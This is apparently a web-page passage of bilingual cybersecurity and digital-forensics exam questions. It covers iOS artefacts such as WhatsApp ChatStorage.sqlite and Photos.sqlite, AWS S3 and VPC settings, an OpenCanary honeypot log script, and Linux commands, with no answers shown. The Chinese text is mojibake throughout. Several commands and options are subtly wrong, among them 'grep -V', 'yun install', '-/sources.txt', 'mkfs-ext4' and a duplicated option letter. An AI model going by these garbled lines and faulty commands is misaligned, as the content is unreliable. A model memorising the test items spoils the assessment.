æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ to answer below question</p><p>æ ¹æ®com.apple.ios.StoreKitUIService.plistï¼Œä¸Šè¿°ç”µè¯çš„æ–‡ä»¶ç³»ç»Ÿæ˜¯ä»€ä¹ˆ?<br>According to com.apple.ios.StoreKitUIService.plist, what is the file system of the phone in question?â€    å•é€‰    A:FAT32;B:NTFS;C:HFS+;D:APFS;E:EXT4</p><h1 id="55-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#55-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="55    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>55    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ®ChatStorage.sqliteï¼Œå“ªäº›å¯¹è¯å·²é”å®š?<br>According to ChatStorage.sqlite where chats are stored, which conversations are locked?</p><p>â€œ    å¤šé€‰    A:447380449879@.whatsapp.net;B:79096209701@.whatsapp.net;C:923109725619@.whatsapp.net;D:85256026169@.whatsapp.net;E:status@broadcast</p><h1 id="56-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#56-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="56    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>56    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ®ChatStorage.sqliteï¼Œæœ‰å¤šå°‘æ®µå½•éŸ³å¯¹è¯?<br>According to ChatStorage.sqlite, how many recorded conversations are there?</p><p>æç¤º: è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in arabic numbers.â€    å¡«ç©º    </p><h1 id="57-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#57-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="57    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>57    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>Apple Cocoa Core Data timestamp æ˜¯ç”±ä»€ä¹ˆæ—¶é—´å¼€å§‹?<br>From what time does the Apple Cocoa Core Data timestamp start?â€    å•é€‰    A:2001å¹´1æœˆ1æ—¥;B:1970å¹´1æœˆ1æ—¥;C:2006å¹´1æœˆ1æ—¥;D:1960å¹´1æœˆ1æ—¥</p><h1 id="58-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#58-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="58    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>58    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ®Photos.sqliteæ•°æ®åº“ä¸­ï¼Œæœ‰å¤šå°‘æ®µè§†é¢‘å¯èƒ½æ¶‰åŠWhatsApp?<br>According to the Photos.sqlite database, how many videos may be related to WhatsApp?</p><p>æç¤º: è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in arabic numbersâ€    å¡«ç©º    </p><h1 id="59-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#59-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="59    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>59    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ to answer below question</p><p>æ ¹æ®Photos.sqliteæ•°æ®åº“ä¸­ï¼Œä¸‹åˆ—å“ªä¸ªé€‰é¡¹å¯¹IMG_0008.HEICçš„æè¿°æ˜¯é”™çš„?<br>According to the â€˜ Photos.sqlite â€˜ database, which of the following descriptions of IMG_0008.HEIC is incorrect?â€    å¤šé€‰    A:ç”±ç¬¬ä¸‰æ–¹è½¯ä»¶æ‹æ‘„;B:ç»è¿‡ä¿®æ”¹;C:ç”±åé•œæ‹æ‘„;D:ç”¨ISO200æ‹æ‘„;E:æ²¡æœ‰å‚¨å­˜ç»çº¬åº¦</p><h1 id="60-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#60-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="60    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>60    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ® â€˜ sms(ios).db â€˜ çš„èµ„æ–™ï¼Œå…¨å±€å”¯ä¸€æ ‡è¯†ç¬¦(GUID): DD31C26F-1D72-DE0F-431E-EF98F104402Dæ˜¾ç¤ºçš„ä¿¡æ¯æ˜¯ä»€ä¹ˆ?<br>According to â€˜ sms(ios).db â€˜, what is the message shown on Globally Unique Identifier (GUID) of DD31C26F-1D72-DE0F-431E-EF98F104402D? </p><p>æç¤º:ç­”æ¡ˆéœ€è¦ä¸ä¿¡æ¯ä¸€æ ·(ç­”æ¡ˆåŒ…æ‹¬ä¸­æ–‡å­—ã€é˜¿æ‹‰ä¼¯æ•°å­—ä¸ç¬¦å·)<br>Tips: Answer should be same as the message (including Chinese words, arabic numbers and symols)â€    å¡«ç©º    </p><h1 id="61-â€œå‚è€ƒ-â€˜-IOS-â€˜-èµ„æ–™-å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#61-â€œå‚è€ƒ-â€˜-IOS-â€˜-èµ„æ–™-å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="61    â€œå‚è€ƒ â€˜ IOS â€˜ èµ„æ–™ å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>61    â€œå‚è€ƒ â€˜ IOS â€˜ èµ„æ–™ å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ® â€˜ com.burbn.instagram.plist â€˜ åŠ â€˜ com.facebook.Facebook.plist â€˜<br>æ‰‹æœºå®‰è£…äº†å®æ—¶é€šè®¯è½¯ä»¶FacebookåŠInstagramçš„é‚£ä¸ªç‰ˆæœ¬? (Instant Messaging Apps)?<br>According to â€˜com.burbn.instagram.plist â€˜ and â€˜ com.facebook.Facebook.plist â€˜, which version of instant messaging apps (Facebook and Instagram) are installed on the phone?â€    å¤šé€‰    A:Instagram (Version 278.0.0.19.115);B:Facebook (Version 410.0.0.41.116);C:Instagram (Version 279.0.0.23.112);D: Facebook (Version 410.0.0.26.115);E: Instagram (Version 278.0.0.25.115);F: Facebook (Version 410.0.0.57.116)</p><h1 id="62-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#62-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="62    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>62    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ® â€˜ ChatStorage(ios).sqlite â€˜ , ç”¨æˆ·æ•°æ®Peter Chow (85262012141)åœ¨ä»€ä¹ˆæ—¥æœŸå’Œæ—¶é—´(ä»¥UTC +8æ—¶åŒº)æ›¾ç»é€šè¿‡å®æ—¶é€šè®¯è½¯ä»¶é€å‡ºä¸€ä¸ªä¿¡æ¯(å†…å®¹ä¸º: I am already home)? </p><p>According to â€˜ ChatStorage(ios).sqlite â€˜, on what day and time (in UTC+8 time zone) did Peter Chan (user information 85262012141) send a message via instant messaging? (Hint: Message Content: I am already home)</p><p>æç¤º:ä»¥UTC +8æ—¶åŒºä½œç­”,å¹¶ä»¥YYYY-MM-DD_HH:MM:SSæ ¼å¼ä½œç­”<br>ä¾‹å¦‚:2023-01-01_10:01:01 (ç­”æ¡ˆæ— éœ€è¾“å…¥UTC +8)<br>Tips: Please answer the question in UTC +8 timezone and use format YYYY-MM-DD_HH:MM:SS to answer.  Example: 2023-01-01_10:01:01â€    å¡«ç©º    </p><h1 id="63-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#63-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="63    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>63    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ®å½±ç‰‡IMG_0687.MOVçš„åŸæ•°æ®ï¼Œæ‰¾å‡ºå½±ç‰‡æ‹æ‘„æ—¶é—´?<br>According to original data of video IMG_0687.MOV, please find out the taping time?</p><p>æç¤º:ä»¥UTC +8æ—¶åŒºä½œç­”,å¹¶ä»¥YYYY-MM-DD_HH:MM:SSæ ¼å¼ä½œç­”<br>ä¾‹å¦‚:2023-01-01_10:01:01 (ç­”æ¡ˆæ— éœ€è¾“å…¥UTC +8)<br>Tips: Please answer the question in UTC +8 timezone and use format YYYY-MM-DD_HH:MM:SS to answer.  Example: 2023-01-01_10:01:01â€    å¡«ç©º    </p><h1 id="64-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#64-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="64    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>64    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ® â€˜ CallHistory(ios).storedata â€˜ï¼Œå“ªä»½è¡¨æ ¼æ˜¾ç¤ºäº†é€šè¯è®°å½•?<br>According to â€˜ CallHistory(ios).storedata â€˜,which table(s) containting the data of call record?â€    å•é€‰    â€œA:    ZCALLBPROPERTIES;B:    ZCALLRECORD;C:    Z_2REMOTEPARTICIPANTHANDLES;D:    Z_METADATA;E:    Z_MODELCACHE;F:    Z_PRIMARYKEY</p><p>â€œ</p><h1 id="65-â€œå‚è€ƒâ€™-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#65-â€œå‚è€ƒâ€™-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="65    â€œå‚è€ƒâ€™ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>65    â€œå‚è€ƒâ€™ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ® â€˜ com.apple.sharingd.plist â€˜ï¼Œè¿™éƒ¨æ‰‹æœºçš„éš”ç©ºæŠ•é€çš„èº«ä»½æ ‡è¯†å·(AirDrop ID)æ˜¯ä»€ä¹ˆ?<br>Accoding to â€˜ com.apple.sharingd.plist â€˜, What is AirDrop ID of the mobile phone?</p><p>æç¤º:è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—ä¸å°å†™å­—æ¯ä½œç­”<br>Tips: Please answer in arabic numbers and lowercase letters.â€    å¡«ç©º    </p><h1 id="66-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#66-â€œå‚è€ƒ-â€˜-IOS-â€˜-æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="66    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>66    â€œå‚è€ƒ â€˜ IOS â€˜ æ–‡ä»¶å¤¹å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ IOS â€˜ folder to answer below question</p><p>æ ¹æ® â€˜ Accounts3.sqlite â€˜ï¼Œè¿™éƒ¨æ‰‹æœºçš„è‹¹æœä½¿ç”¨è€…è´¦å· (Apple ID) æ˜¯ä»€ä¹ˆ?<br>According to  â€˜ Accounts3.sqlite â€˜, what is the Apple ID of this mobile phone?</p><p>æç¤º:è¯·ä»¥ç”µé‚®æ ¼å¼ä½œç­”(ä¾‹:jack2023@hotmail.com)<br>Please answer in email format (Example: jasck2023@hotmail.com)â€    å¡«ç©º    </p><h1 id="67-â€œå“ªä¸€è¡Œä»£ç çš„æ˜¯è´Ÿè´£æ›´æ–°åœ¨GitHubä½¿ç”¨ä¸­çš„-journal-æ–‡ä»¶çš„æ›´æ–°å†å²è®°å½•"><a href="#67-â€œå“ªä¸€è¡Œä»£ç çš„æ˜¯è´Ÿè´£æ›´æ–°åœ¨GitHubä½¿ç”¨ä¸­çš„-journal-æ–‡ä»¶çš„æ›´æ–°å†å²è®°å½•" class="headerlink" title="67    â€œå“ªä¸€è¡Œä»£ç çš„æ˜¯è´Ÿè´£æ›´æ–°åœ¨GitHubä½¿ç”¨ä¸­çš„ .journal æ–‡ä»¶çš„æ›´æ–°å†å²è®°å½• ?"></a>67    â€œå“ªä¸€è¡Œä»£ç çš„æ˜¯è´Ÿè´£æ›´æ–°åœ¨GitHubä½¿ç”¨ä¸­çš„ .journal æ–‡ä»¶çš„æ›´æ–°å†å²è®°å½• ?</h1><p>Which line of code in the script is responsible for updating GitHub with the updated history of the .journal file?</p><p>line 1 git config â€”global user.name â€œâ€mikeseztoâ€â€<br>line 2 git config â€”global user.email â€œâ€smike@general.orgâ€â€<br>line 3<br>line 4 cd which-truth<br>line 5 rm.journal<br>line 6<br>line 7 git add.journal<br>line 8 git commit -m â€œâ€Remove sensitive dataâ€â€<br>line 9 git push<br>line 10<br>line 11 git clone â€”mirror <a href="http://github.com/smike/which-truth">http://github.com/smike/which-truth</a><br>line 12<br>line 13 java -jar bfg.jar â€”delete-files.journal which-truth<br>line 14 cd which-truth<br>line 15 git reflog expire â€”expire=now â€”all<br>line 16 git gc â€”prune=now â€”aggressive<br>line 17 git push â€”force<br>â€œ    å•é€‰    A. 08;B. 13;C. 16;D. 17</p><h1 id="68-â€œä¸‹åˆ—å“ªä¸€è¡ŒAWS-S3-Bucketæˆæƒç­–ç•¥ä¸­çš„è®¾ç½®æœ‰é—®é¢˜"><a href="#68-â€œä¸‹åˆ—å“ªä¸€è¡ŒAWS-S3-Bucketæˆæƒç­–ç•¥ä¸­çš„è®¾ç½®æœ‰é—®é¢˜" class="headerlink" title="68    â€œä¸‹åˆ—å“ªä¸€è¡ŒAWS S3 Bucketæˆæƒç­–ç•¥ä¸­çš„è®¾ç½®æœ‰é—®é¢˜?"></a>68    â€œä¸‹åˆ—å“ªä¸€è¡ŒAWS S3 Bucketæˆæƒç­–ç•¥ä¸­çš„è®¾ç½®æœ‰é—®é¢˜?</h1><p>Which line of setting in the following AWS bucket policy statement is in question?<br>line 1 {<br>line 2   â€œâ€Versionâ€â€: â€œâ€2020-11-12â€â€,<br>line 3   â€œâ€Statementâ€â€: [<br>line 4       {<br>line 5         â€œâ€Sidâ€â€: â€œâ€PublicReadGetObjectâ€â€,<br>line 6         â€œâ€Effectâ€â€: â€œâ€Allowâ€â€,<br>line 7         â€œâ€Principalâ€â€: â€œâ€<em>â€œâ€,<br>line 8         â€œâ€Actionâ€â€: â€œâ€s3:GetObjectâ€â€,<br>line 9         â€œâ€Resourceâ€â€: â€œâ€arn:aws:s3:::company-sensitive-14dnid23nfief/</em>â€œâ€<br>line 10     }<br>line 11   ]<br>line 12 }</p><p>â€œ    å•é€‰    A. 2;B. 7;C. 8;D. 9</p><h1 id="69-â€œä»¥ä¸‹å“ªé¡¹æ˜¯å¤šé‡èº«ä»½éªŒè¯-MFA-çš„ç¤ºä¾‹"><a href="#69-â€œä»¥ä¸‹å“ªé¡¹æ˜¯å¤šé‡èº«ä»½éªŒè¯-MFA-çš„ç¤ºä¾‹" class="headerlink" title="69    â€œä»¥ä¸‹å“ªé¡¹æ˜¯å¤šé‡èº«ä»½éªŒè¯ (MFA) çš„ç¤ºä¾‹"></a>69    â€œä»¥ä¸‹å“ªé¡¹æ˜¯å¤šé‡èº«ä»½éªŒè¯ (MFA) çš„ç¤ºä¾‹</h1><p>Which of the following is an example of multi-factor authentication (MFA)?<br>â€œ    å•é€‰    â€œA. PIN ç å’Œè½¯ä»¶ä»¤ç‰Œ PIN and software token;B. æŒ‡çº¹å’Œè§†ç½‘è†œæ‰«æ fingerprint and retinal scan;C. ç”¨æˆ·åå’Œå¯†ç username and password;D. ä¸€æ¬¡æ€§çŸ­ä¿¡ä»£ç å’Œç¡¬ä»¶ä»¤ç‰Œone-time SMS code and a hardware token<br>â€œ</p><h1 id="70-â€œAWSç”¨å®¶åœ¨æˆ·å£ç½‘ç»œè¿›è¡Œè®¾å®šï¼Œè€Œè¿™äº›è®¾å®šä¼šè®°å½•ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ã€‚ç¬¬-11-è¡Œä»£ç ä¸­çš„è®¾å®šå¯ä»¥æ‰¾åˆ°å“ªäº›ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ä¿¡æ¯ï¼Ÿ"><a href="#70-â€œAWSç”¨å®¶åœ¨æˆ·å£ç½‘ç»œè¿›è¡Œè®¾å®šï¼Œè€Œè¿™äº›è®¾å®šä¼šè®°å½•ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ã€‚ç¬¬-11-è¡Œä»£ç ä¸­çš„è®¾å®šå¯ä»¥æ‰¾åˆ°å“ªäº›ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ä¿¡æ¯ï¼Ÿ" class="headerlink" title="70    â€œAWSç”¨å®¶åœ¨æˆ·å£ç½‘ç»œè¿›è¡Œè®¾å®šï¼Œè€Œè¿™äº›è®¾å®šä¼šè®°å½•ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ã€‚ç¬¬ 11 è¡Œä»£ç ä¸­çš„è®¾å®šå¯ä»¥æ‰¾åˆ°å“ªäº›ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ä¿¡æ¯ï¼Ÿ"></a>70    â€œAWSç”¨å®¶åœ¨æˆ·å£ç½‘ç»œè¿›è¡Œè®¾å®šï¼Œè€Œè¿™äº›è®¾å®šä¼šè®°å½•ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ã€‚ç¬¬ 11 è¡Œä»£ç ä¸­çš„è®¾å®šå¯ä»¥æ‰¾åˆ°å“ªäº›ç”¨æˆ·æˆ–ç¬¬ä¸‰è€…çš„æ´»åŠ¨ä¿¡æ¯ï¼Ÿ</h1><p>An AWS user is setting up his AWS account.  Those setting will record the activities of the user or third party.  What user or third party information could be found in line 11 of code in the script ? </p><p>line 1  sudo yum install python-pip -y<br>line 2  sudo pip install opencanary<br>line 3<br>line 4  sudo opencanaryd â€”copyconfig<br>line 5<br>line 6  opencanaryd â€”start<br>line 7<br>line 8<br>line 9  sudo yun install jq -y<br>line 10<br>line 11  jq -r .src_host /var/tmp/opencanary.log | grep -V ^$ | sort | uniq &gt; -/sources.txt<br>line 12  jq -r .logdata.USERNAME /var/tmp/opencanary.log | grep -V null | sort | uniq &gt; -/usernames.txt<br>line 13  jq -r .logdata.PASSWORD /var/tmp/opencanary.log | grep -V null | sort | uniq &gt; -/passwords.txt</p><p>â€œ    å•é€‰    A. User Name  ç”¨æˆ·çš„åç§°;B. User Source  ç”¨æˆ·çš„æ¥æº;C. Attacker Name  æ”»å‡»è€…çš„åç§°;D. Attacker Source  æ”»å‡»è€…çš„æ¥æº</p><h1 id="71-â€œAWSç”¨æˆ·è®¾ç½®äº†ä¸€ä¸ªVPCï¼ŒIPåœ°å€èŒƒå›´ä¸º10-0-0-0-10-0-0-24ã€‚-ä¸‹åˆ—å“ªä¸ª-IP-åœ°å€ç”¨äº-DNS"><a href="#71-â€œAWSç”¨æˆ·è®¾ç½®äº†ä¸€ä¸ªVPCï¼ŒIPåœ°å€èŒƒå›´ä¸º10-0-0-0-10-0-0-24ã€‚-ä¸‹åˆ—å“ªä¸ª-IP-åœ°å€ç”¨äº-DNS" class="headerlink" title="71    â€œAWSç”¨æˆ·è®¾ç½®äº†ä¸€ä¸ªVPCï¼ŒIPåœ°å€èŒƒå›´ä¸º10.0.0.0-10.0.0.24ã€‚ ä¸‹åˆ—å“ªä¸ª IP åœ°å€ç”¨äº DNS ?"></a>71    â€œAWSç”¨æˆ·è®¾ç½®äº†ä¸€ä¸ªVPCï¼ŒIPåœ°å€èŒƒå›´ä¸º10.0.0.0-10.0.0.24ã€‚ ä¸‹åˆ—å“ªä¸ª IP åœ°å€ç”¨äº DNS ?</h1><p>An AWS user sets a VPC with IP address space of 10.0.0.0-10.0.0.24ï¼ŒWhich of the following IP address is used for DNS?<br>â€œ    å•é€‰    A. 10.0.0.0;B. 10.0.0.1;C. 10.0.0.2;D. 10.0.0.3</p><h1 id="72-â€œä»¥ä¸‹å“ªç§ç±»å‹çš„äº‘æœåŠ¡ç”¨äºæ“ä½œç³»ç»Ÿå’Œç½‘ç»œ"><a href="#72-â€œä»¥ä¸‹å“ªç§ç±»å‹çš„äº‘æœåŠ¡ç”¨äºæ“ä½œç³»ç»Ÿå’Œç½‘ç»œ" class="headerlink" title="72    â€œä»¥ä¸‹å“ªç§ç±»å‹çš„äº‘æœåŠ¡ç”¨äºæ“ä½œç³»ç»Ÿå’Œç½‘ç»œ ?"></a>72    â€œä»¥ä¸‹å“ªç§ç±»å‹çš„äº‘æœåŠ¡ç”¨äºæ“ä½œç³»ç»Ÿå’Œç½‘ç»œ ?</h1><p>Which of the following type of Cloud service is used for operating systems and network?<br>â€œ    å•é€‰    â€œA. è½¯ä»¶å³æœåŠ¡Software as a Service;B. å¹³å°å³æœåŠ¡Platform as a Service;C. åŸºç¡€æ¶æ„å³æœåŠ¡ Infrasture as a Service;D. æ•°æ®å³æœåŠ¡ Data as a Service<br>â€œ</p><h1 id="73-â€œä»¥ä¸‹å“ªé¡¹æ˜¯Bastionhostçš„ç‰¹ç‚¹ï¼Ÿ"><a href="#73-â€œä»¥ä¸‹å“ªé¡¹æ˜¯Bastionhostçš„ç‰¹ç‚¹ï¼Ÿ" class="headerlink" title="73    â€œä»¥ä¸‹å“ªé¡¹æ˜¯Bastionhostçš„ç‰¹ç‚¹ï¼Ÿ"></a>73    â€œä»¥ä¸‹å“ªé¡¹æ˜¯Bastionhostçš„ç‰¹ç‚¹ï¼Ÿ</h1><p>What is the feature of a bastionhost?<br>â€œ    å•é€‰    â€œA. åŒ…å«æ•æ„Ÿä¿¡æ¯ Contains sensitive information;B. æ— æ³•è®¿é—®å†…éƒ¨ç³»ç»Ÿ No access to internal systems;C. é™åˆ¶æš´éœ²çš„æœåŠ¡ Limits exposed services;D. æ²¡æœ‰è¿æ¥åˆ°äº’è”ç½‘ No connection to the internet<br>â€œ</p><h1 id="74-â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿï¼Ÿ"><a href="#74-â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿï¼Ÿ" class="headerlink" title="74    â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿï¼Ÿ"></a>74    â€œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå“ªä¸ªå‘½ä»¤å¯ä»¥ç”¨äºåˆ›å»ºæ–‡ä»¶ç³»ç»Ÿï¼Ÿ</h1><p>In Linux system, which command can be used to create file system ?<br>â€œ    å•é€‰    A:mount /dev/sda3 /mnt/usb;B:mkfs-ext4 /dev/sda2;C:mkfs-ext3 /sys/sda1;D:pvcreate /dev/sda;C:genfstab -U -p /mnt</p><h1 id="75-â€œâ€˜Linkâ€™å®é™…ä¸Šæ˜¯æŒ‡å‘LINUXç³»ç»Ÿä¸­å¦ä¸€ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æŒ‡æ ‡ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥äº§ç”Ÿä¸‹é¢çš„ç»“æœ"><a href="#75-â€œâ€˜Linkâ€™å®é™…ä¸Šæ˜¯æŒ‡å‘LINUXç³»ç»Ÿä¸­å¦ä¸€ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æŒ‡æ ‡ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥äº§ç”Ÿä¸‹é¢çš„ç»“æœ" class="headerlink" title="75    â€œâ€˜Linkâ€™å®é™…ä¸Šæ˜¯æŒ‡å‘LINUXç³»ç»Ÿä¸­å¦ä¸€ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æŒ‡æ ‡ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥äº§ç”Ÿä¸‹é¢çš„ç»“æœ:"></a>75    â€œâ€˜Linkâ€™å®é™…ä¸Šæ˜¯æŒ‡å‘LINUXç³»ç»Ÿä¸­å¦ä¸€ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æŒ‡æ ‡ã€‚ä»¥ä¸‹å“ªä¸ªå‘½ä»¤å¯ä»¥äº§ç”Ÿä¸‹é¢çš„ç»“æœ:</h1><p>A link is actually a pointer to another file or folder in the Linux system.  Which of the following command can generate below result?</p><blockquote><p>ls -ilas<br>|total 0<br>|9731253 0 drwxr-xr-x 1 user users 4096 Jul 14 13:31 .<br>|1725961 0 drwxr-xr-x 1 user users 4096 Jul 14 13:29 ..<br>|90371467 0 -rw-râ€”râ€” 2 user users 90 Jul 14 13:30 testing.txt<br>|90371467 0 -rw-râ€”râ€” 2 user users 90 Jul 14 13:30 shotcut-testing.txt<br>â€œ    å•é€‰    A:link -s testing.txt shotcut-testing.txt;B:ln -s shotcut.txt testing.txt;C:ln testing.txt shotcut-testing.txt;D:ln -s testing.txt shotcut-testing.txt;E:ln shotcut.txt testing.txt</p><h1 id="76-â€œä»¥ä¸‹å“ªä¸ªå‘½ä»¤ç”¨äºåœ¨Linuxç³»ç»Ÿä¸­åˆ›å»ºåˆ†åŒºï¼Ÿ"><a href="#76-â€œä»¥ä¸‹å“ªä¸ªå‘½ä»¤ç”¨äºåœ¨Linuxç³»ç»Ÿä¸­åˆ›å»ºåˆ†åŒºï¼Ÿ" class="headerlink" title="76    